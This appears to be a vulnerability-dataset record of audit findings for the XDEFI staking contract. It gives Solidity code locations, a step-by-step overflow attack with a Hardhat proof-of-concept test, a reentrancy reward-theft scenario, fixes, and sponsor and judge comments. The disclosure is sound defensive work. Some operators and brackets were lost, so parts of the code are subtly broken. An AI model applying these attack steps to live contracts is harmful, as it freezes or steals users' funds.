[
    {
        "Code": "",
        "CodeNames": [
            ""
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-01",
                "Location": [
                    "//solidity\n_pointsPerUnit += ((newXDEFI * _pointsMultiplier) / totalUnitsCached);\n",
                    "//solidity\n_pointsPerUnit += ((170141183460469 * 2128) / 1);\n",
                    "//solidity\n_pointsPerUnit += ((250_000 * 1e18 * 2128) / (1_000_000 * 1e18 + 1));\n"
                ],
                "Type": " Malicious early user/attacker can malfunction the contract and even freeze users' funds in edge cases",
                "Description": "\n<https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L151-L151\n\nsolidity\n_pointsPerUnit += ((newXDEFI * _pointsMultiplier) / totalUnitsCached);\n\n\nIn the current implementation,  _pointsPerUnit can be changed in updateDistribution() which can be called by anyone.\n\nA malicious early user can lock() with only 1 wei of XDEFI and makes _pointsPerUnit to be very large, causing future users not to be able to lock() and/or unlock() anymore due to overflow in arithmetic related to _pointsMultiplier.\n\nAs a result, the contract can be malfunctioning and even freeze users' funds in edge cases.\n\n\nGiven:\n\n*   bonusMultiplierOf[30 days] = 100\n\n1.  Alice lock() 1 wei of XDEFI for 30 days as the first user of the contract. Got 1 units, and totalUnits now is 1;\n2.  Alice sends 170141183460469 wei of XDEFI to the contract and calls updateDistribution():\n\nsolidity\n_pointsPerUnit += ((170141183460469 * 2128) / 1);\n\n\n3.  Bob tries to lock() 1,100,000 * 1e18 of XDEFI for 30 days, the tx will fail, as _pointsPerUnit * units overlows;\n4.  Bob lock() 1,000,000 * 1e18 of XDEFI for 30 days;\n5.  The rewarder sends 250,000 * 1e18 of XDEFI to the contract and calls updateDistribution():\n\nsolidity\n_pointsPerUnit += ((250_000 * 1e18 * 2128) / (1_000_000 * 1e18 + 1));\n\n\n6.  30 days later, Bob tries to call unlock(), the tx will fail, as _pointsPerUnit * units overflows.\n\n",
                "Repair": "\nUniswap v2 solved a similar problem by sending the first 1000 lp tokens to the zero address.\n\nThe same solution should work here, i.e., on constructor set an initial amount (like 1e8) for totalUnits\n\n<https://github.com/XDeFi-tech/xdefi-distribution/blob/3856a42df295183b40c6eee89307308f196612fe/contracts/XDEFIDistribution.sol#L39-L44\n\nsolidity\nconstructor (address XDEFI_, string memory baseURI_, uint256 zeroDurationPointBase_) ERC721(\"Locked XDEFI\", \"lXDEFI\") {\n    require((XDEFI = XDEFI_) != address(0), \"INVALID_TOKEN\");\n    owner = msg.sender;\n    baseURI = baseURI_;\n    _zeroDurationPointBase = zeroDurationPointBase_;\n\n    totalUnits = 100_000_000;\n}\n\n\ndeluca-mike (XDEFI) confirmed(https://github.com/code-423n4/2022-01-xdefi-findings/issues/156#issuecomment-1008255566):\n This is a great catch! I just tested it:\n \n js\n const { expect } = require(\"chai\");\n const { ethers } = require(\"hardhat\");\n \n const totalSupply = '240000000000000000000000000';\n \n const toWei = (value, add = 0, sub = 0) = (BigInt(value) * 1_000_000_000_000_000_000n + BigInt(add) BigInt(sub)).toString();\n \n describe(\"XDEFIDistribution\", () = {\n     it(\"Can overflow _pointsPerUnit\", async () = {\n         const god, alice, bob] = await ethers.getSigners();\n \n         const XDEFI = await (await (await ethers.getContractFactory(\"XDEFI\")).deploy(\"XDEFI\", \"XDEFI\", totalSupply)).deployed();\n         const XDEFIDistribution = await (await (await ethers.getContractFactory(\"XDEFIDistribution\")).deploy(XDEFI.address, \"https://www.xdefi.io/nfts/\", 0)).deployed();\n \n         // Give each account 2,000,000 XDEFI\n         await (await XDEFI.transfer(alice.address, toWei(2_000_000))).wait();\n         await (await XDEFI.transfer(bob.address, toWei(2_000_000))).wait();\n \n         // bonusMultiplierOf[30 days] = 100\n         await (await XDEFIDistribution.setLockPeriods([2592000], 100])).wait();\n \n         // 1. Alice lock() 1 wei of XDEFI for 30 days as the first user of the contract. Got 1 units, and totalUnits now is 1;\n         await (await XDEFI.connect(alice).approve(XDEFIDistribution.address, 1)).wait();\n         await (await XDEFIDistribution.connect(alice).lock(1, 2592000, alice.address)).wait();\n         expect(await XDEFIDistribution.balanceOf(alice.address)).to.equal('1');\n         const nft1 = (await XDEFIDistribution.tokenOfOwnerByIndex(alice.address, 0)).toString();\n         expect((await XDEFIDistribution.positionOf(nft1)).units).to.equal(1);\n \n         // 2. Alice sends 170141183460469 wei of XDEFI to the contract and calls updateDistribution()\n         await (await XDEFI.connect(alice).transfer(XDEFIDistribution.address, 170141183460469)).wait();\n         await (await XDEFIDistribution.connect(alice).updateDistribution()).wait();\n \n         // 3. Bob tries to lock() 1,100,000 * 1e18 of XDEFI for 30 days, the tx will fail, as _pointsPerUnit * units overflows\n         await (await XDEFI.connect(bob).approve(XDEFIDistribution.address, toWei(1_100_000))).wait();\n         await expect(XDEFIDistribution.connect(bob).lock(toWei(1_100_000), 2592000, bob.address)).to.be.revertedWith(\"_toInt256Safe failed\");\n \n         // 4. Bob lock() 1,000,000 * 1e18 of XDEFI for 30 days\n         await (await XDEFI.connect(bob).approve(XDEFIDistribution.address, toWei(1_000_000))).wait();\n         await (await XDEFIDistribution.connect(bob).lock(toWei(1_000_000), 2592000, bob.address)).wait();\n         expect(await XDEFIDistribution.balanceOf(bob.address)).to.equal('1');\n         const nft2 = (await XDEFIDistribution.tokenOfOwnerByIndex(bob.address, 0)).toString();\n         expect((await XDEFIDistribution.positionOf(nft2)).units).to.equal(toWei(1_000_000));\n \n         // 5. The rewarder sends 250,000 * 1e18 of XDEFI to the contract and calls updateDistribution()\n         await (await XDEFI.transfer(XDEFIDistribution.address, toWei(250_000))).wait();\n         await (await XDEFIDistribution.updateDistribution()).wait();\n \n         // 6. 30 days later, Bob tries to call unlock(), the tx will fail, as _pointsPerUnit * units overflows.\n         await hre.ethers.provider.send('evm_increaseTime', 2592000]);\n         await expect(XDEFIDistribution.connect(bob).unlock(nft2, bob.address)).to.be.revertedWith(\"_toInt256Safe failed\");\n     });\n });\n \n \n While I do like the suggestion to to totalUnits = 100_000_000; in the constructor, it will result \"uneven\" numbers due to the totalUnits offset. I wonder if I can resolve this but just reducing _pointsMultiplier to uint256(296) as per https://github.com/ethereum/EIPs/issues/1726#issuecomment-472352728.\n\ndeluca-mike (XDEFI) commented(https://github.com/code-423n4/2022-01-xdefi-findings/issues/156#issuecomment-1008266150):\n OK, I think I can solve this with _pointsMultiplier = uint256(272):\n \n js\n const { expect } = require(\"chai\");\n const { ethers } = require(\"hardhat\");\n \n const totalSupply = '240000000000000000000000000';\n \n const toWei = (value, add = 0, sub = 0) = (BigInt(value) * 1_000_000_000_000_000_000n + BigInt(add) BigInt(sub)).toString();\n \n describe(\"XDEFIDistribution\", () = {\n     it(\"Can overflow _pointsPerUnit\", async () = {\n         const god, alice, bob] = await ethers.getSigners();\n \n         const XDEFI = await (await (await ethers.getContractFactory(\"XDEFI\")).deploy(\"XDEFI\", \"XDEFI\", totalSupply)).deployed();\n         const XDEFIDistribution = await (await (await ethers.getContractFactory(\"XDEFIDistribution\")).deploy(XDEFI.address, \"https://www.xdefi.io/nfts/\", 0)).deployed();\n \n         // Give each account 100M XDEFI\n         await (await XDEFI.transfer(alice.address, toWei(100_000_000))).wait();\n         await (await XDEFI.transfer(bob.address, toWei(100_000_000))).wait();\n \n         // bonusMultiplierOf[30 days] = 255\n         await (await XDEFIDistribution.setLockPeriods([2592000], 255])).wait();\n \n         // 1. Alice lock() 1 wei of XDEFI for 30 days as the first user of the contract. Got 1 units, and totalUnits now is 1\n         await (await XDEFI.connect(alice).approve(XDEFIDistribution.address, 1)).wait();\n         await (await XDEFIDistribution.connect(alice).lock(1, 2592000, alice.address)).wait();\n         expect(await XDEFIDistribution.balanceOf(alice.address)).to.equal('1');\n         const nft1 = (await XDEFIDistribution.tokenOfOwnerByIndex(alice.address, 0)).toString();\n         expect((await XDEFIDistribution.positionOf(nft1)).units).to.equal(2);\n \n         // 2. Alice sends 100M XDEFI minus 1 wei to the contract and calls updateDistribution()\n         await (await XDEFI.connect(alice).transfer(XDEFIDistribution.address, toWei(100_000_000, 0, 1))).wait();\n         await (await XDEFIDistribution.connect(alice).updateDistribution()).wait();\n \n         // 3. Bob can lock() 100M XDEFI for 30 days\n         await (await XDEFI.connect(bob).approve(XDEFIDistribution.address, toWei(100_000_000))).wait();\n         await (await XDEFIDistribution.connect(bob).lock(toWei(100_000_000), 2592000, bob.address)).wait();\n         expect(await XDEFIDistribution.balanceOf(bob.address)).to.equal('1');\n         const nft2 = (await XDEFIDistribution.tokenOfOwnerByIndex(bob.address, 0)).toString();\n         expect((await XDEFIDistribution.positionOf(nft2)).units).to.equal(toWei(255_000_000));\n \n         // 4. The rewarder sends 40M XDEFI to the contract and calls updateDistribution()\n         await (await XDEFI.transfer(XDEFIDistribution.address, toWei(40_000_000))).wait();\n         await (await XDEFIDistribution.updateDistribution()).wait();\n \n         // 5. 30 days later, Bob can call unlock()\n         await hre.ethers.provider.send('evm_increaseTime', 2592000]);\n         await (await XDEFIDistribution.connect(bob).unlock(nft2, bob.address)).wait();\n     });\n });\n \n\ndeluca-mike (XDEFI) commented(https://github.com/code-423n4/2022-01-xdefi-findings/issues/156#issuecomment-1012773001):\n In the release candidate contract(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol), in order to preserve the math (formulas), at the cost of some accuracy, we went with a _pointsMultiplier of 72 bits(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L23).\n \n Also, a minimum units locked(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L53) is enforced, to prevent \"dust\" from creating a very very high _pointsPerUnit.\n \n Tests were written in order to stress test the contract against the above extreme cases.\n \n Further, a \"no-going-back\" emergency mode setter(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L100) was implemented that allows (but does not force) users to withdraw only their deposits(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L147) without any of the funds distribution math from being expected, in the event that some an edge case does arise.\n\nIvshti (Judge) commented(https://github.com/code-423n4/2022-01-xdefi-findings/issues/156#issuecomment-1013782548):\n fantastic finding, agreed with the proposed severity!\n \n The sponsor fixes seem adequate: a lower _poinsMultiplier, a minimum lock and an emergency mode that disables reward math, somewhat similar to emergency withdraw functions in contracts like masterchef.\n\n\n\n\n"
            },
            {
                "Name": "H-02",
                "Location": [
                    "//solidity\nfunction _safeMint(\n    address to,\n    uint256 tokenId,\n    bytes memory _data\n) internal virtual {\n    _mint(to, tokenId);\n    require(\n        _checkOnERC721Received(address(0), to, tokenId, _data),\n        \"ERC721: transfer to non ERC721Receiver implementer\"\n    );\n}\n...\nfunction _checkOnERC721Received(\n    address from,\n    address to,\n    uint256 tokenId,\n    bytes memory _data\n) private returns (bool) {\n    if (to.isContract()) {\n        try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {\n            return retval == IERC721Receiver.onERC721Received.selector;\n",
                    "//solidity\nfunction lock(uint256 amount_, uint256 duration_, address destination_) external noReenter returns (uint256 tokenId_) {\n    // Lock the XDEFI in the contract.\n    SafeERC20.safeTransferFrom(IERC20(XDEFI), msg.sender, address(this), amount_);\n\n    // Handle the lock position creation and get the tokenId of the locked position.\n    return _lock(amount_, duration_, destination_);\n}\n...\n    function _lock(uint256 amount_, uint256 duration_, address destination_) internal returns (uint256 tokenId_) {\n    // Prevent locking 0 amount in order generate many score-less NFTs, even if it is inefficient, and such NFTs would be ignored.\n    require(amount_ != uint256(0) && amount_ <= MAX_TOTAL_XDEFI_SUPPLY, \"INVALID_AMOUNT\");\n\n    // Get bonus multiplier and check that it is not zero (which validates the duration).\n    uint8 bonusMultiplier = bonusMultiplierOf[duration_];\n    require(bonusMultiplier != uint8(0), \"INVALID_DURATION\");\n\n    // Mint a locked staked position NFT to the destination.\n    _safeMint(destination_, tokenId_ = _generateNewTokenId(_getPoints(amount_, duration_)));\n\n    // Track deposits.\n    totalDepositedXDEFI += amount_;\n",
                    "//solidity\n    function updateDistribution() external {\n       uint256 totalUnitsCached = totalUnits;\n\n       require(totalUnitsCached uint256(0), \"NO_UNIT_SUPPLY\");\n\n       uint256 newXDEFI = _toUint256Safe(_updateXDEFIBalance());\n\n       if (newXDEFI == uint256(0)) return;\n\n       _pointsPerUnit += ((newXDEFI * _pointsMultiplier) / totalUnitsCached);\n\n       emit DistributionUpdated(msg.sender, newXDEFI);\n   }\n   ...\n   function _updateXDEFIBalance() internal returns (int256 newFundsTokenBalance_) {\n       uint256 previousDistributableXDEFI = distributableXDEFI;\n       uint256 currentDistributableXDEFI = distributableXDEFI = IERC20(XDEFI).balanceOf(address(this))-totalDepositedXDEFI;\n\n       return _toInt256Safe(currentDistributableXDEFI)-_toInt256Safe(previousDistributableXDEFI);\n   }\n\n",
                    "//solidity\n\nfunction unlock(uint256 tokenId_, address destination_) external noReenter returns (uint256 amountUnlocked_) {\n    // Handle the unlock and get the amount of XDEFI eligible to withdraw.\n    amountUnlocked_ = _unlock(msg.sender, tokenId_);\n\n    // Send the the unlocked XDEFI to the destination.\n    SafeERC20.safeTransfer(IERC20(XDEFI), destination_, amountUnlocked_);\n\n    // NOTE: This needs to be done after updating `totalDepositedXDEFI` (which happens in `_unlock`) and transferring out.\n    _updateXDEFIBalance();\n}\n...\nfunction _unlock(address account_, uint256 tokenId_) internal returns (uint256 amountUnlocked_) {\n    // Check that the account is the position NFT owner.\n    require(ownerOf(tokenId_) == account_, \"NOT_OWNER\");\n\n    // Fetch position.\n    Position storage position = positionOf[tokenId_];\n    uint96 units = position.units;\n    uint88 depositedXDEFI = position.depositedXDEFI;\n    uint32 expiry = position.expiry;\n\n    // Check that enough time has elapsed in order to unlock.\n    require(expiry != uint32(0), \"NO_LOCKED_POSITION\");\n    require(block.timestamp = uint256(expiry), \"CANNOT_UNLOCK\");\n\n    // Get the withdrawable amount of XDEFI for the position.\n    amountUnlocked_ = _withdrawableGiven(units, depositedXDEFI, position.pointsCorrection);\n\n    // Track deposits.\n    totalDepositedXDEFI -= uint256(depositedXDEFI);\n\n    // Burn FDT Position.\n    totalUnits -= units;\n    delete positionOf[tokenId_];\n\n    emit LockPositionWithdrawn(tokenId_, account_, amountUnlocked_);\n}\n...\nfunction _withdrawableGiven(uint96 units_, uint88 depositedXDEFI_, int256 pointsCorrection_) internal view returns (uint256 withdrawableXDEFI_) {\n    return\n        (\n            _toUint256Safe(\n                _toInt256Safe(_pointsPerUnit * uint256(units_)) +\n                pointsCorrection_\n            ) / _pointsMultiplier\n        ) + uint256(depositedXDEFI_);\n}\n"
                ],
                "Type": " The reentrancy vulnerability in _safeMint can allow an attacker to steal all rewards",
                "Description": "\nThere is a reentrancy vulnerability in the _safeMint function\nsolidity\nfunction _safeMint(\n    address to,\n    uint256 tokenId,\n    bytes memory _data\n) internal virtual {\n    _mint(to, tokenId);\n    require(\n        _checkOnERC721Received(address(0), to, tokenId, _data),\n        \"ERC721: transfer to non ERC721Receiver implementer\"\n    );\n}\n...\nfunction _checkOnERC721Received(\n    address from,\n    address to,\n    uint256 tokenId,\n    bytes memory _data\n) private returns (bool) {\n    if (to.isContract()) {\n        try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {\n            return retval == IERC721Receiver.onERC721Received.selector;\n\nThe lock function changes the totalDepositedXDEFI variable after calling the _safeMint function\nsolidity\nfunction lock(uint256 amount_, uint256 duration_, address destination_) external noReenter returns (uint256 tokenId_) {\n    // Lock the XDEFI in the contract.\n    SafeERC20.safeTransferFrom(IERC20(XDEFI), msg.sender, address(this), amount_);\n\n    // Handle the lock position creation and get the tokenId of the locked position.\n    return _lock(amount_, duration_, destination_);\n}\n...\n    function _lock(uint256 amount_, uint256 duration_, address destination_) internal returns (uint256 tokenId_) {\n    // Prevent locking 0 amount in order generate many score-less NFTs, even if it is inefficient, and such NFTs would be ignored.\n    require(amount_ != uint256(0) && amount_ <= MAX_TOTAL_XDEFI_SUPPLY, \"INVALID_AMOUNT\");\n\n    // Get bonus multiplier and check that it is not zero (which validates the duration).\n    uint8 bonusMultiplier = bonusMultiplierOf[duration_];\n    require(bonusMultiplier != uint8(0), \"INVALID_DURATION\");\n\n    // Mint a locked staked position NFT to the destination.\n    _safeMint(destination_, tokenId_ = _generateNewTokenId(_getPoints(amount_, duration_)));\n\n    // Track deposits.\n    totalDepositedXDEFI += amount_;\n\n\nSince the updateDistribution function does not use the noReenter modifier, the attacker can re-enter the updateDistribution function in the _safeMint function. Since the value of totalDepositedXDEFI is not updated at this time, the _pointsPerUnit variable will become abnormally large.\n\nsolidity\n    function updateDistribution() external {\n       uint256 totalUnitsCached = totalUnits;\n\n       require(totalUnitsCached uint256(0), \"NO_UNIT_SUPPLY\");\n\n       uint256 newXDEFI = _toUint256Safe(_updateXDEFIBalance());\n\n       if (newXDEFI == uint256(0)) return;\n\n       _pointsPerUnit += ((newXDEFI * _pointsMultiplier) / totalUnitsCached);\n\n       emit DistributionUpdated(msg.sender, newXDEFI);\n   }\n   ...\n   function _updateXDEFIBalance() internal returns (int256 newFundsTokenBalance_) {\n       uint256 previousDistributableXDEFI = distributableXDEFI;\n       uint256 currentDistributableXDEFI = distributableXDEFI = IERC20(XDEFI).balanceOf(address(this))-totalDepositedXDEFI;\n\n       return _toInt256Safe(currentDistributableXDEFI)-_toInt256Safe(previousDistributableXDEFI);\n   }\n\n\n\nIf the attacker calls the lock function to get the NFT before exploiting the reentrance vulnerability, then the unlock function can be called to steal a lot of rewards, and the assets deposited by the user using the reentrance vulnerability can also be redeemed by calling the unlock function. Since the unlock function calls the _updateXDEFIBalance function, the attacker cannot steal the assets deposited by the user\nsolidity\n\nfunction unlock(uint256 tokenId_, address destination_) external noReenter returns (uint256 amountUnlocked_) {\n    // Handle the unlock and get the amount of XDEFI eligible to withdraw.\n    amountUnlocked_ = _unlock(msg.sender, tokenId_);\n\n    // Send the the unlocked XDEFI to the destination.\n    SafeERC20.safeTransfer(IERC20(XDEFI), destination_, amountUnlocked_);\n\n    // NOTE: This needs to be done after updating totalDepositedXDEFI (which happens in _unlock) and transferring out.\n    _updateXDEFIBalance();\n}\n...\nfunction _unlock(address account_, uint256 tokenId_) internal returns (uint256 amountUnlocked_) {\n    // Check that the account is the position NFT owner.\n    require(ownerOf(tokenId_) == account_, \"NOT_OWNER\");\n\n    // Fetch position.\n    Position storage position = positionOf[tokenId_];\n    uint96 units = position.units;\n    uint88 depositedXDEFI = position.depositedXDEFI;\n    uint32 expiry = position.expiry;\n\n    // Check that enough time has elapsed in order to unlock.\n    require(expiry != uint32(0), \"NO_LOCKED_POSITION\");\n    require(block.timestamp = uint256(expiry), \"CANNOT_UNLOCK\");\n\n    // Get the withdrawable amount of XDEFI for the position.\n    amountUnlocked_ = _withdrawableGiven(units, depositedXDEFI, position.pointsCorrection);\n\n    // Track deposits.\n    totalDepositedXDEFI -= uint256(depositedXDEFI);\n\n    // Burn FDT Position.\n    totalUnits -= units;\n    delete positionOf[tokenId_];\n\n    emit LockPositionWithdrawn(tokenId_, account_, amountUnlocked_);\n}\n...\nfunction _withdrawableGiven(uint96 units_, uint88 depositedXDEFI_, int256 pointsCorrection_) internal view returns (uint256 withdrawableXDEFI_) {\n    return\n        (\n            _toUint256Safe(\n                _toInt256Safe(_pointsPerUnit * uint256(units_)) +\n                pointsCorrection_\n            ) / _pointsMultiplier\n        ) + uint256(depositedXDEFI_);\n}\n\n\n\n<https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-beta.0/contracts/XDEFIDistribution.sol#L253-L281\n\n",
                "Repair": "\n       function updateDistribution() external  {\n    +    function updateDistribution() external  noReenter {\n\n\ndeluca-mike (XDEFI) resolved(https://github.com/code-423n4/2022-01-xdefi-findings/issues/25#issuecomment-1008233320):\n Valid and a big issue. However, due to other recommendations, I will not solve it this way. Instead, updateDistribution() will be called at the start of every lock/unlock function (so it can't have a noReenter modifier), and the _safeMint calls will be moved to the end of their respective operations to prevent the effect of the re-entrancy (i.e. position will created with a _pointsPerUnit before a re-entering from _safeMint can affect it). Tests will be added to show this is not longer possible.\n\ndeluca-mike (XDEFI) commented(https://github.com/code-423n4/2022-01-xdefi-findings/issues/25#issuecomment-1012774852):\n In our release candidate contract, as mentioned above, updateDistribution() is called before each locking and unlocking function, via a updatePointsPerUnitAtStart modifier(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L77-L80), and thus, updateDistribution() is now a public fucntion, and since it is used by other functions, cannot be behind a noReenter.\n \n See:\n lock(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L177)\n lockWithPermit(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L181)\n relock(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L188)\n unlock(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L195)\n relockBatch(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L233)\n unlockBatch(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L240)\n \n Also, a test was written(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/test/XDEFIDistributionReceivers.js) to ensure that this is no longer exploitable, and that the contract behaves properly if a re-entrancy call updateDistribution().\n\nIvshti (Judge) commented(https://github.com/code-423n4/2022-01-xdefi-findings/issues/25#issuecomment-1013783009):\n Agreed with the severity.\n \n Resolution of reordering the calls seems to be adequate \n\n\n\n \n\n"
            },
            {
                "Name": "M-01",
                "Location": [
                    "//solidity\nfunction _lock(uint256 amount_, uint256 duration_, address destination_) internal returns (uint256 tokenId_) {\n    // Prevent locking 0 amount in order generate many score-less NFTs, even if it is inefficient, and such NFTs would be ignored.\n    require(amount_ != uint256(0) && amount_ <= MAX_TOTAL_XDEFI_SUPPLY, \"INVALID_AMOUNT\");\n\n    // Get bonus multiplier and check that it is not zero (which validates the duration).\n    uint8 bonusMultiplier = bonusMultiplierOf[duration_];\n    require(bonusMultiplier != uint8(0), \"INVALID_DURATION\");\n\n    // Mint a locked staked position NFT to the destination.\n    _safeMint(destination_, tokenId_ = _generateNewTokenId(_getPoints(amount_, duration_)));\n\n    // Track deposits.\n    totalDepositedXDEFI += amount_;\n\n    // Create Position.\n    uint96 units = uint96((amount_ * uint256(bonusMultiplier)) / uint256(100));\n    totalUnits += units;\n    positionOf[tokenId_] =\n        Position({\n            units: units,\n            depositedXDEFI: uint88(amount_),\n            expiry: uint32(block.timestamp + duration_),\n            created: uint32(block.timestamp),\n            bonusMultiplier: bonusMultiplier,\n            pointsCorrection: -_toInt256Safe(_pointsPerUnit * units)\n        });\n\n    emit LockPositionCreated(tokenId_, destination_, amount_, duration_);\n}\n",
                    "//solidity\nfunction _generateNewTokenId(uint256 points_) internal view returns (uint256 tokenId_) {\n    // Points is capped at 128 bits (max supply of XDEFI for 10 years locked), total supply of NFTs is capped at 128 bits.\n    return (points_ << uint256(128)) + uint128(totalSupply() + 1);\n}\n",
                    "//solidity\nfunction merge(uint256[] memory tokenIds_, address destination_) external returns (uint256 tokenId_) {\n    uint256 count = tokenIds_length;\n    require(count  uint256(1), \"MIN_2_TO_MERGE\");\n\n    uint256 points;\n\n    // For each NFT, check that it belongs to the caller, burn it, and accumulate the points.\n    for (uint256 i; i < count; ++i) {\n        uint256 tokenId = tokenIds_[i];\n        require(ownerOf(tokenId) == msg.sender, \"NOT_OWNER\");\n        require(positionOf[tokenId].expiry == uint32(0), \"POSITION_NOT_UNLOCKED\");\n\n        _burn(tokenId);\n\n        points += _getPointsFromTokenId(tokenId);\n    }\n\n    // Mine a new NFT to the destinations, based on the accumulated points.\n    _safeMint(destination_, tokenId_ = _generateNewTokenId(points));\n}\n"
                ],
                "Type": "  _safeMint  Will Fail Due To An Edge Case In Calculating  tokenId  Using The  _generateNewTokenId  Function",
                "Description": "\n\nNFTs are used to represent unique positions referenced by the generated tokenId. The tokenId value contains the position's score in the upper 128 bits and the index wrt. the token supply in the lower 128 bits.\n\nWhen positions are unlocked after expiring, the relevant position stored in the positionOf mapping is deleted, however, the NFT is not. The merge() function is used to combine points in unlocked NFTs, burning the underlying NFTs upon merging. As a result, _generateNewTokenId() may end up using the same totalSupply() value, causing _safeMint() to fail if the same amount_ and duration_ values are used.\n\nThis edge case only occurs if there is an overlap in the points_ and totalSupply() + 1 values used to generate tokenId. As a result, this may impact a user's overall experience while interacting with the XDEFI protocol, as some transactions may fail unexpectedly.\n\nsolidity\nfunction _lock(uint256 amount_, uint256 duration_, address destination_) internal returns (uint256 tokenId_) {\n    // Prevent locking 0 amount in order generate many score-less NFTs, even if it is inefficient, and such NFTs would be ignored.\n    require(amount_ != uint256(0) && amount_ <= MAX_TOTAL_XDEFI_SUPPLY, \"INVALID_AMOUNT\");\n\n    // Get bonus multiplier and check that it is not zero (which validates the duration).\n    uint8 bonusMultiplier = bonusMultiplierOf[duration_];\n    require(bonusMultiplier != uint8(0), \"INVALID_DURATION\");\n\n    // Mint a locked staked position NFT to the destination.\n    _safeMint(destination_, tokenId_ = _generateNewTokenId(_getPoints(amount_, duration_)));\n\n    // Track deposits.\n    totalDepositedXDEFI += amount_;\n\n    // Create Position.\n    uint96 units = uint96((amount_ * uint256(bonusMultiplier)) / uint256(100));\n    totalUnits += units;\n    positionOf[tokenId_] =\n        Position({\n            units: units,\n            depositedXDEFI: uint88(amount_),\n            expiry: uint32(block.timestamp + duration_),\n            created: uint32(block.timestamp),\n            bonusMultiplier: bonusMultiplier,\n            pointsCorrection: -_toInt256Safe(_pointsPerUnit * units)\n        });\n\n    emit LockPositionCreated(tokenId_, destination_, amount_, duration_);\n}\n\nsolidity\nfunction _generateNewTokenId(uint256 points_) internal view returns (uint256 tokenId_) {\n    // Points is capped at 128 bits (max supply of XDEFI for 10 years locked), total supply of NFTs is capped at 128 bits.\n    return (points_ << uint256(128)) + uint128(totalSupply() + 1);\n}\n\n\nsolidity\nfunction merge(uint256[] memory tokenIds_, address destination_) external returns (uint256 tokenId_) {\n    uint256 count = tokenIds_length;\n    require(count  uint256(1), \"MIN_2_TO_MERGE\");\n\n    uint256 points;\n\n    // For each NFT, check that it belongs to the caller, burn it, and accumulate the points.\n    for (uint256 i; i < count; ++i) {\n        uint256 tokenId = tokenIds_[i];\n        require(ownerOf(tokenId) == msg.sender, \"NOT_OWNER\");\n        require(positionOf[tokenId].expiry == uint32(0), \"POSITION_NOT_UNLOCKED\");\n\n        _burn(tokenId);\n\n        points += _getPointsFromTokenId(tokenId);\n    }\n\n    // Mine a new NFT to the destinations, based on the accumulated points.\n    _safeMint(destination_, tokenId_ = _generateNewTokenId(points));\n}\n\n\n",
                "Repair": "\nConsider replacing totalSupply() in _generateNewTokenId() with an internal counter. This should ensure that _generateNewTokenId() always returns a unique tokenId that is monotomically increasing .\n\ndeluca-mike (XDEFI) confirmed(https://github.com/code-423n4/2022-01-xdefi-findings/issues/17#issuecomment-1012535766):\n In the release candidate contract, _generateNewTokenId now used an internal _tokensMinted variable(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L36) instead of totalSupply(), as seen here(https://github.com/XDeFi-tech/xdefi-distribution/blob/v1.0.0-rc.0/contracts/XDEFIDistribution.sol#L393).\nIvshti (Judge) commented(https://github.com/code-423n4/2022-01-xdefi-findings/issues/17#issuecomment-1013783639):\n Agreed with sponsor\n \n As for mitigation, the new way to generate token IDs seems cleaner, but more gas consuming\n\n\n"
            }
        ]
    }
]